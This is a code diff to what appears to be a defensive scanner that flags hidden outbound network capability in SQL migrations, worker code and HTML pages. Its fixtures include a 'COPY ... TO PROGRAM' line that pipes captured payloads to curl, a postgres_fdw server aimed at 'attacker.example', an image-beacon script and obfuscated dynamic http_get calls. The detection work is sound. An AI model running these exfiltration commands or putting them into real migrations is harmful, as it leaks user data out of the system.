@@ -613,6 +613,8 @@ function hasAiRuntimeBoundary(content, path = "") {
     || sqlStructuralTokens(sqlLexicalContent).some((token) => token.type === "string"
       && /(?:dblink|postgres_fdw)/i.test(token.value))
   );
+  const hasSqlServerProgramCapability = normalizedPath.endsWith(".sql")
+    && sqlTokens.some((token, index) => token === "copy" && sqlTokens.slice(index + 1).includes("program"));
   const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
   const approvedEgressHosts = new Set([
     "api.github.com",
@@ -687,6 +689,10 @@ function hasAiRuntimeBoundary(content, path = "") {
   const hasDynamicCapabilityLookup = /\b(?:globalThis|Reflect|eval|Function)\b|\b(?:self|window)\s*\[/.test(normalizedContent);
   const domSinkRemainder = normalizedContent.replace(/\bnew\s+URL\s*\(/g, "(");
   const domSinkPinnedFiles = new Set(["apps/worker/src/app-assets.ts", "apps/worker/src/index.ts"]);
+  const hasUnapprovedHtmlActiveContent = normalizedPath.endsWith(".html") && (
+    /<\s*(?:script|form|iframe|frame|audio|video|source|track|object|embed|base)\b/i.test(domSinkRemainder)
+    || /<\s*meta\b[^>]*http-equiv\s*=\s*["']?refresh\b/i.test(domSinkRemainder)
+  );
   const hasUnapprovedDomSink = !domSinkPinnedFiles.has(path)
     && !path.endsWith(".html")
     && (/\b(?:document|DOMParser|Image|location|open)\b|\.(?:submit|requestSubmit)\s*\(|\btext\/html\b/i.test(domSinkRemainder)
@@ -698,7 +704,8 @@ function hasAiRuntimeBoundary(content, path = "") {
     || /\b(?:import|require)\s*\(/.test(normalizedContent)
     || /\bResponse\.redirect\s*\(/.test(normalizedContent)
     || /\bpg_net\b|\bnet\s*\.\s*http_(?:get|post|delete|head)\b|\bsupabase_functions\s*\.\s*http_request\b|\bextensions\s*\.\s*http(?:_(?:get|post|put|delete|head))?\b|\bhttp(?:_(?:get|post|put|delete|head))?\s*\(/i.test(capabilityContent)
-    || hasDynamicSqlExecute || hasSqlOutboundToken || hasSqlUnicodeEscapedIdentifier || hasSqlUnicodeEscapedString || hasSqlNumericEscape || hasLegacySqlBackslashEscapes || hasUnapprovedSqlSetConfig || hasPgSettingsReference || hasSqlSchedulingCapability || hasExternalDatabaseCapability || hasAdjacentSqlStrings
+    || hasUnapprovedHtmlActiveContent
+    || hasDynamicSqlExecute || hasSqlOutboundToken || hasSqlUnicodeEscapedIdentifier || hasSqlUnicodeEscapedString || hasSqlNumericEscape || hasLegacySqlBackslashEscapes || hasUnapprovedSqlSetConfig || hasPgSettingsReference || hasSqlSchedulingCapability || hasExternalDatabaseCapability || hasSqlServerProgramCapability || hasAdjacentSqlStrings
   );
   return (
     hasUnapprovedLiteralEgress || hasUnapprovedDirectFetch || hasUnapprovedConfigOrigin || hasUnapprovedMemberFetch || hasFetchAlias || hasFetchCapabilityEscape || hasDynamicCapabilityLookup || hasUnapprovedOutboundCapability ||
@@ -800,6 +807,7 @@ for (const fixture of [
   { content: "create extension postgres_fdw; create server hidden foreign data wrapper postgres_fdw options (host 'attacker.example');", path: "supabase/migrations/99999999999999-postgres-fdw-outbound.sql" },
   { content: "create foreign data wrapper hidden handler extensions.postgres_fdw_handler validator extensions.postgres_fdw_validator;", path: "supabase/migrations/99999999999999-postgres-fdw-handler-outbound.sql" },
   { content: "create function hidden_handler() returns fdw_handler as '$libdir/postgres_fdw', 'postgres_fdw_handler' language c; create foreign data wrapper hidden handler hidden_handler;", path: "supabase/migrations/99999999999999-postgres-fdw-library-outbound.sql" },
+  { content: "copy (select payload from capture_events) to program 'h=api.groq.com; curl -d @- $h';", path: "supabase/migrations/99999999999999-copy-program-outbound.sql" },
   { content: "alter role current_user set standard_conforming_strings to off;", path: "supabase/migrations/99999999999999-alter-role-legacy-escape.sql" },
   { content: "alter database meccha_manual set standard_conforming_strings = 'off';", path: "supabase/migrations/99999999999999-alter-database-legacy-escape.sql" },
   { content: "select set_config('standard_conforming_strings', 'off', false); create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-set-config-body-outbound.sql" },
@@ -825,6 +833,7 @@ for (const fixture of [
   { content: 'const config = inspectSupabaseConfig(env).config; const config = { url: env.DISCORD_PUBLIC_KEY ?? "", anonKey: "" }; return fetch(`${config.url}${path}`);', path: "apps/worker/src/index.ts" },
   { content: 'fetch(`${config.url}${path}`); fetch(`${config.url}${path}`);', path: "apps/worker/src/index.ts" },
   { content: 'const phase1Worker = env.AI_PROXY; return phase1Worker.fetch(request);', path: "apps/worker/src/provider.ts" },
+  { content: '<script>new Image().src = new URLSearchParams(location.search).get("u")</script>', path: "apps/brand-site/public/dynamic-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
 ]) {
   if (!hasAiRuntimeBoundary(fixture.content, fixture.path)) {
